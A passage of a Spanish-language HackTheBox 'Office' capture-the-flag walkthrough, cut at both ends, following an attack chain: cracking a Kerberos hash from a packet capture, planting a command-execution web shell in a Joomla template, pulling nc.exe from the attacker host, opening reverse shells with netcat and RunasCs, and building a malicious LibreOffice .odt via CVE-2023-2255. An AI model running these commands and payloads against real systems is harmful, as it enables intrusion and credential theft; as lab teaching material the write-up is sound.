+drw-rw-rw-          0  Wed Feb 14 04:18:31 2024 ..
+-rw-rw-rw-    1372860  Wed May 10 12:51:42 2023 Latest-System-Dump-8fbc124d.pcap
+# get Latest-System-Dump-8fbc124d.pcap
+</code></pre></div></div>
+<ul>
+<li>Vamos a examinarlo con <code>Wireshark</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ wireshark -r Latest-System-Dump-8fbc124d.pcap &amp;&gt;/dev/null &amp; disown
+[1] 19927
+</code></pre></div></div>
+<ul>
+<li>Bueno hay demasiados paquetes.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/4.png">
+</p>
+
+<ul>
+<li>Como estamos ante un Domain Controller y filtramos por kerberos encontramos 2 peticiones y examinando una encontramos lo que parece ser un hash.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/5.png">
+</p>
+
+<ul>
+<li>Vemos que el hash pertenece al usuario tstark.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/6.png">
+</p>
+
+<ul>
+<li><code>Hashcat</code> nos comparte la forma correcta en la cual el hash debería estar para poder crackearlo <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613
+a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
+</code></pre></div></div>
+<ul>
+<li><p>Ahora usando el Hash Mode que corresponde a Kerberos podemos crackearlo.</p>
+</li>
+<li><p>Tenemos la contraseña.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ hashcat -m 19900 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 1426/2916 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Slow-Hash-SIMD-LOOP
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
+Hash.Target......: $krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c56...86f5fc
+Time.Started.....: Thu Jul 18 18:51:55 2024 (2 secs)
+Time.Estimated...: Thu Jul 18 18:51:57 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     5459 H/s (11.00ms) @ Accel:256 Loops:512 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 5120/14344385 (0.04%)
+Rejected.........: 0/5120 (0.00%)
+Restore.Point....: 4608/14344385 (0.03%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3584-4095
+Candidate.Engine.: Device Generator
+Candidates.#1....: Liverpool -&gt; babygrl
+Hardware.Mon.#1..: Util: 99%
+
+Started: Thu Jul 18 18:51:17 2024
+Stopped: Thu Jul 18 18:51:58 2024
+</code></pre></div></div>
+<ul>
+<li>Tenemos credenciales nuevas <code>tstark:playboy69</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cme smb office.htb -u 'tstark' -p 'playboy69'
+SMB         office.htb      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         office.htb      445    DC               [+] office.htb\tstark:playboy69
+</code></pre></div></div>
+<ul>
+<li>Ahora si nos podemos conectar al Joomla.</li>
+</ul>
+<blockquote>
+<p>Las credenciales con ese usuario no funcionan pero como el único usuario que vemos es Tony Stark podemos suponer que el es el usuario administrador del sitio así que si vamos al panel de login y usamos las siguientes credenciales podemos conectarnos <code>administrator:playboy69</code>.</p>
+</blockquote>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/7.png">
+</p>
+
+<blockquote>
+<p>Hay un Template que se llama Cassiopeia el cual podemos ver que ejecuta PHP, System --&gt; Site Templates --&gt; Cassiopeia Details and Files vamos a editar el archivo error.php para poder obtener ejecución remota de comandos ya que podemos hacerlo por que estamos como el usuario Administrador.</p>
+</blockquote>
+<ul>
+<li>Vamos a eliminar todo el contenido que tiene y a poner esta simple línea para que mediante el parámetro cmd poder hacer ejecución de comandos.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/8.png">
+</p>
+
+<ul>
+<li><p>Ahora le damos click a Save para guardar los cambios.</p>
+</li>
+<li><p>Funciona.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl 'http://office.htb/templates/cassiopeia/error.php?cmd=whoami'
+office\web_account
+</code></pre></div></div>
+<ul>
+<li>Ahora para ganar acceso vamos a subir el netcat a la maquina victima.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre></div></div>
+<ul>
+<li>Ahora simplemente hacemos la petición para descargarlo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl 'http://office.htb/templates/cassiopeia/error.php?cmd=powershell+iwr+10.10.14.74:80/nc.exe+-O+nc.exe'
+</code></pre></div></div>
+<ul>
+<li>Ahora nos ponemos en escucha.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rlwrap nc -nlvp 443
+listening on [any] 443 ...
+</code></pre></div></div>
+<ul>
+<li>Nos enviamos la reverse shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl 'http://office.htb/templates/cassiopeia/error.php?cmd=nc.exe+10.10.14.74+443+-e+cmd.exe'
+</code></pre></div></div>
+<ul>
+<li>Recibimos la shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rlwrap nc -lvvp  443
+listening on [any] 443 ...
+connect to [10.10.14.74] from office.htb [10.10.11.3] 58197
+Microsoft Windows [Version 10.0.20348.2322]
+(c) Microsoft Corporation. All rights reserved.
+C:\xampp\htdocs\joomla\templates\cassiopeia&gt;whoami
+whoami
+office\web_account
+
+C:\xampp\htdocs\joomla\templates\cassiopeia&gt;
+</code></pre></div></div>
+<h2 id="shell-as-tstark">Shell as tstark</h2>
+<ul>
+<li>El usuario tstark esta usuario valido.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\xampp\htdocs\joomla\templates\cassiopeia&gt;net user
+net user
+
+User accounts for \\DC
+
+-------------------------------------------------------------------------------
+Administrator            dlanor                   dmichael
+dwolfe                   etower                   EWhite
+Guest                    HHogan                   krbtgt
+PPotts                   tstark                   web_account
+The command completed successfully.
+
+
+C:\xampp\htdocs\joomla\templates\cassiopeia&gt;
+</code></pre></div></div>
+<ul>
+<li>Como tenemos credenciales vamos a usar Runas <a href="https://github.com/antonioCoco/RunasCs/releases">https://github.com/antonioCoco/RunasCs/releases</a> para enviarnos una shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\xampp\htdocs\joomla\templates\cassiopeia&gt;powershell iwr http://10.10.14.74/RunasCs.exe -o RunasCs.exe
+powershell iwr http://10.10.14.74/RunasCs.exe -o RunasCs.exe
+</code></pre></div></div>
+<ul>
+<li>Ahora nos ponemos en escucha.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rlwrap nc -lvvp 4444
+listening on [any] 4444 ...
+</code></pre></div></div>
+<ul>
+<li>Nos enviamos la shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\xampp\htdocs\joomla\templates\cassiopeia&gt;.\RunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.74:4444
+.\RunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.74:4444
+[*] Warning: The logon for user 'tstark' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-a4110$\Default
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 6024 created in background.
+</code></pre></div></div>
+<ul>
+<li>Ahora estamos como ese usuario.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rlwrap nc -lvvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.74] from office.htb [10.10.11.3] 58226
+Microsoft Windows [Version 10.0.20348.2322]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+office\tstark
+
+C:\Windows\system32&gt;
+</code></pre></div></div>
+<h2 id="shell-as-ppotts">Shell as ppotts</h2>
+<ul>
+<li>Bueno podemos ver la user flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Windows\system32&gt;type  C:\users\tstark\desktop\user.txt
+type  C:\users\tstark\desktop\user.txt
+7a8bcc49138ecf42c7a6202ab4129dd2
+
+C:\Windows\system32&gt;
+</code></pre></div></div>
+<ul>
+<li>Vemos que al parecer hay otro web.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\xampp\htdocs\internal&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is C626-9388
+
+ Directory of C:\xampp\htdocs\internal
+
+01/30/2024  09:39 AM    &lt;DIR&gt;          .
+05/09/2023  07:53 AM    &lt;DIR&gt;          ..
+02/14/2024  06:35 PM    &lt;DIR&gt;          applications
+05/01/2023  04:27 PM    &lt;DIR&gt;          css
+05/01/2023  04:27 PM    &lt;DIR&gt;          img
+01/30/2024  09:38 AM             5,113 index.html
+01/30/2024  09:40 AM             5,282 resume.php
+               2 File(s)         10,395 bytes
+               5 Dir(s)   5,069,225,984 bytes free
+
+C:\xampp\htdocs\internal&gt;
+</code></pre></div></div>
+<ul>
+<li>Vemos que nos hablan sobre una subida de archivos al parecer de un resume.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\xampp\htdocs\internal&gt;type resume.php
+type resume.php
+&lt;?php
+$notifi = &quot;&quot;;
+if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot; ){
+  $stdname=trim($_POST['fullname']);
+  $email=str_replace('.','-',$_POST['email']);
+  $experience=trim($_POST['experience']);
+  $salary=trim($_POST['salary']);
+  $department=trim($_POST['department']);
+  $rewritefn = strtolower(str_replace(' ','-',&quot;$stdname-$department-$salary $experience $email&quot;));
+
+  $filename =$_FILES['assignment']['name'];
+  $filetype= $_FILES['assignment']['type'];
+  $filesize =$_FILES['assignment']['size'];
+  $fileerr = $_FILES['assignment']['error'];
+  $filetmp = $_FILES['assignment']['tmp_name'];
+  chmod($_FILES['assignment']['tmp_name'], 0664);
+  // onigiri in .
+ $ext = explode('.',$filename);
+  //last piece of data from array
+ $extension = strtolower(end($ext));
+  $filesallowed = array('docm','docx','doc','odt');
+   if(in_array($extension,$filesallowed)){
+     if ($fileerr === 0){
+       if ($filesize &lt; 5242880){
+	 $ff = &quot;$rewritefn.$extension&quot;;
+	 $loc = &quot;applications/&quot;.$ff;
+	   if(move_uploaded_file($filetmp,$loc))
+	   {
+	     // upload successful
+	     $notifi=&quot;&lt;span class=notifi&gt;✔ Upload Successful!&lt;/span&gt;&lt;hr/&gt;&lt;style&gt;
+	       button, input , select, option, h3{
+			display:none;
+		}
+	       &lt;/style&gt;&quot;;
+	 } else {
+echo $loc;
+	 $notifi=&quot;&lt;span class=notifi&gt;✖️  Something Went Wrong! Unable To upload the Resume!&lt;/span&gt;&lt;hr/&gt;&quot;;
+	 }
+
+       } else {
+	
+	 $notifi=&quot;&lt;span class=notifi&gt;⚠️  Your Resume should be less than 5MB!&lt;/span&gt;&lt;hr/&gt;&quot;;
+       }
+
+     } else {
+   $notifi=&quot;&lt;span class=notifi&gt;✖️  Corrupted File/Unable to Upload!&lt;/span&gt;&lt;hr/&gt;&quot;;
+     }
+
+   } else {
+   $notifi=&quot;&lt;span class=notifi&gt;❌ Accepted File Types : Doc, Docx, Docm, Odt!&lt;/span&gt;&lt;hr/&gt;&quot;;
+   }
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+	&lt;link rel=&quot;shortcut icon&quot; href=&quot;https://www.pinclipart.com/picdir/big/344-3445944_png-file-svg-terminal-icon-png-clipart.png&quot;&gt;
+  &lt;title&gt;Resume Submission&lt;/title&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+&lt;style type=&quot;text/css&quot;&gt;
+body{
+height:100%;
+overflow:auto;
+}
+.notifi{
+font-weight:bold;
+padding:0px;
+}
+.notifi hr{
+background:#000000;
+height:2px;
+}
+.magic{
+margin-top:0.5%;
+max-height:90%;
+max-width:90%;
+border: 2px solid #000000;
+}
+.inpstylef{
+border-bottom: 2px solid #000000;
+padding:0.5%;
+font-size:14px;
+font-weight:bold;
+}
+.inputstyle ,.inpstyles {
+width:69%;
+height:35px;
+border:2px solid #000000;
+}
+.inpstylef::-webkit-file-upload-button {
+  visibility: hidden;
+}
+.inpstylef::before {
+  content: '  ';
+  display: inline-block;
+  border: 1px solid #999;
+  border-radius: 3px;
+  padding: 5px 8px;
+  outline: none;
+  white-space: nowrap;
+  -webkit-user-select: none;
+  cursor: pointer;
+  text-shadow: 1px 1px #fff;
+  font-weight: 700;
+  font-size: 10pt;
+}
+::placeholder{
+color:#151715;
+opacity:1;
+font-weight:bold;
+}
+.magic h3{
+    text-align: left;
+    padding-left: 260px;
+
+}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;center&gt;
+    &lt;div class=&quot;magic&quot;&gt;
+      &lt;h1&gt; Job Application Submission&lt;/h1&gt;
+	&lt;hr style=&quot;width:inherit;padding:0px;height:2px; background:#000000&quot;/&gt;
+	&lt;span class=&quot;notifi&quot;&gt;&lt;?php echo &quot;$notifi&quot;; ?&gt;&lt;/span&gt;
+      &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;h3&gt;Full Name:&lt;/h3&gt;
+        &lt;input class=&quot;inputstyle&quot; type=&quot;text&quot; name=&quot;fullname&quot; placeholder=&quot;Example : John Doe&quot; required&gt;
+        &lt;h3&gt;Email:&lt;/h3&gt;
+        &lt;input class=&quot;inputstyle&quot; type=&quot;email&quot; name=&quot;email&quot; placeholder=&quot; Example : xxx123@xyz.abc&quot; required&gt;
+        &lt;h3&gt;Work Experience&lt;/h3&gt;
+        &lt;select id=&quot;&quot; style=&quot;background:#151715; color:#ffffff; font-weight:bold&quot;  class=&quot;inpstyles&quot; name=&quot;experience&quot; required&gt;
+          &lt;option class=&quot;inpstyl&quot;&gt;0-5 years&lt;/option&gt;
+          &lt;option class=&quot;inpstyl&quot;&gt;10-20 years&lt;/option&gt;
+          &lt;option class=&quot;inpstyl&quot;&gt;20-30 years&lt;/option&gt;
+	&lt;/select&gt;&lt;br/&gt;
+	  &lt;h3&gt;Requested Salary&lt;/h3&gt;
+        &lt;select id=&quot;&quot; class=&quot;inpstyles&quot; style=&quot;background:#151715; color:#ffffff; font-weight:bold&quot; name=&quot;salary&quot; required&gt;
+          &lt;option value=&quot;30 000&quot; class=&quot;inpstyl&quot;&gt;30 000$&lt;/option&gt;
+          &lt;option value=&quot;60 000&quot; class=&quot;inpstyl&quot;&gt;60 000$&lt;/option&gt;
+          &lt;option value=&quot;80 000&quot; class=&quot;inpstyl&quot;&gt;80 000$&lt;/option&gt;
+          &lt;option value=&quot;100 000&quot; class=&quot;inpstyl&quot;&gt;100 000$&lt;/option&gt;
+          &lt;option value=&quot;200 000&quot; class=&quot;inpstyl&quot;&gt;200 000$&lt;/option&gt;
+          &lt;option value=&quot;300 000&quot; class=&quot;inpstyl&quot;&gt;300 000$&lt;/option&gt;
+        &lt;/select&gt;&lt;br/&gt;&lt;br/&gt;
+	 &lt;h3&gt;Choose Your Department&lt;/h3&gt;
+        &lt;select id=&quot;&quot; class=&quot;inpstyles&quot;style=&quot;background:#151715; color:#ffffff; font-weight:bold&quot;  name=&quot;department&quot; required&gt;
+          &lt;option value=&quot;IT&quot; class=&quot;inpstyl&quot;&gt;IT&lt;/option&gt;
+          &lt;option value=&quot;Sales&quot; class=&quot;inpstyl&quot;&gt;Sales&lt;/option&gt;
+          &lt;option value=&quot;Management&quot; class=&quot;inpstyl&quot;&gt;Management&lt;/option&gt;
+        &lt;/select&gt;
+        &lt;br&gt;
+        &lt;br&gt;&lt;div style=&quot;display:flex; flex-direction:column;  align-items: center;justify-content: center;&quot;&gt;
+	 &lt;h3 style=&quot;padding-left:50px&quot; &gt;Upload Resume:&lt;/h3&gt;
+        &lt;input id=&quot;&quot; class=&quot;inpstylef&quot; type=&quot;file&quot; name=&quot;assignment&quot;&gt;&lt;/div&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;br&gt;
+        &lt;button type=&quot;submit&quot; style=&quot;margin-bottom:15px; color:#ffffff; background:#151715; width:50%; font-weight:bold ;height:35px&quot; name=&quot;submit&quot;&gt;Upload Resume&lt;/button&gt;
+      &lt;/form&gt;
+    &lt;/div&gt;
+  &lt;/center&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
+C:\xampp\htdocs\internal&gt;
+</code></pre></div></div>
+<ul>
+<li><p>Nos dice que acepta archivos <code>docx, doc, odt y docm</code> ya que comprueba la extensión del archivo y los guarda dentro de applications.</p>
+</li>
+<li><p>Si buscamos vulnerabilidades encontramos la siguiente <a href="https://github.com/elweth-sec/CVE-2023-2255">https://github.com/elweth-sec/CVE-2023-2255</a>.</p>
+</li>
+<li><p>Usa LibreOffice supongo que es el que abre el archivo.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\xampp\htdocs\internal&gt;dir &quot;C:\Program Files&quot;
+dir &quot;C:\Program Files&quot;
+ Volume in drive C has no label.
+ Volume Serial Number is C626-9388
+
+ Directory of C:\Program Files
+
+02/14/2024  03:18 AM    &lt;DIR&gt;          .
+01/22/2024  10:58 AM    &lt;DIR&gt;          Common Files
+01/25/2024  01:20 PM    &lt;DIR&gt;          Internet Explorer
+01/17/2024  02:26 PM    &lt;DIR&gt;          LibreOffice 5
+05/02/2023  05:22 PM    &lt;DIR&gt;          Microsoft OneDrive
+05/08/2021  01:20 AM    &lt;DIR&gt;          ModifiableWindowsApps
+04/14/2023  03:22 PM    &lt;DIR&gt;          Npcap
+04/12/2023  04:30 PM    &lt;DIR&gt;          Oracle
+02/14/2024  03:18 AM    &lt;DIR&gt;          VMware
+04/17/2023  03:35 PM    &lt;DIR&gt;          Windows Defender
+01/25/2024  01:20 PM    &lt;DIR&gt;          Windows Defender Advanced Threat Protection
+01/25/2024  01:20 PM    &lt;DIR&gt;          Windows Mail
+01/25/2024  01:20 PM    &lt;DIR&gt;          Windows Media Player
+05/08/2021  02:35 AM    &lt;DIR&gt;          Windows NT
+03/02/2022  08:58 PM    &lt;DIR&gt;          Windows Photo Viewer
+05/08/2021  01:34 AM    &lt;DIR&gt;          WindowsPowerShell
+04/14/2023  03:23 PM    &lt;DIR&gt;          Wireshark
+               0 File(s)              0 bytes
+              17 Dir(s)   5,061,500,928 bytes free
+
+C:\xampp\htdocs\internal&gt;
+</code></pre></div></div>
+<ul>
+<li>Al parecer <a href="https://github.com/elweth-sec/CVE-2023-2255">https://github.com/elweth-sec/CVE-2023-2255</a> nos genera un <code>odt</code> malicioso que podremos en applications.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ git clone https://github.com/elweth-sec/CVE-2023-2255
+❯ python3 CVE-2023-2255.py -h
+usage: CVE-2023-2255.py [-h] --cmd CMD [--output OUTPUT]
+
+CVE-2023-2255
+
+options:
+  -h, --help       show this help message and exit
+  --cmd CMD        Command to execute
+  --output OUTPUT  Output filename
+</code></pre></div></div>
+<ul>
+<li>Vamos a generar el <code>.odt</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ python3 CVE-2023-2255.py --cmd 'C:\xampp\htdocs\joomla\templates\cassiopeia\nc.exe 10.10.14.74 4949 -e cmd.exe ' --output yiyi.odt
+File yiyi.odt has been created !
+</code></pre></div></div>
+<ul>
+<li>Ahora nos ponemos en escucha.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rlwrap nc -lvvp 4949
+listening on [any] 4949 ...
+</code></pre></div></div>
+<ul>
+<li><p>Ahora dentro de la carpeta applications vamos a poner el <code>.odt</code>.</p>
+</li>
+<li><p>Todo esto como el usuario web_account ya que ese usuario tiene privilegios de lectura en ese directorio.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\xampp\htdocs\internal&gt;icacls applications
+icacls applications
+applications CREATOR OWNER:(OI)(CI)(IO)(F)
+             OFFICE\PPotts:(OI)(CI)(NP)(F)
+             NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+             NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
+             OFFICE\web_account:(OI)(CI)(RX,W)
+             BUILTIN\Administrators:(OI)(CI)(F)
+             BUILTIN\Users:(OI)(CI)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\xampp\htdocs\internal\applications&gt;curl http://10.10.14.74:8080/yiyi.odt -o yiyi.odt
+curl http://10.10.14.74:8080/yiyi.odt -o yiyi.odt
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
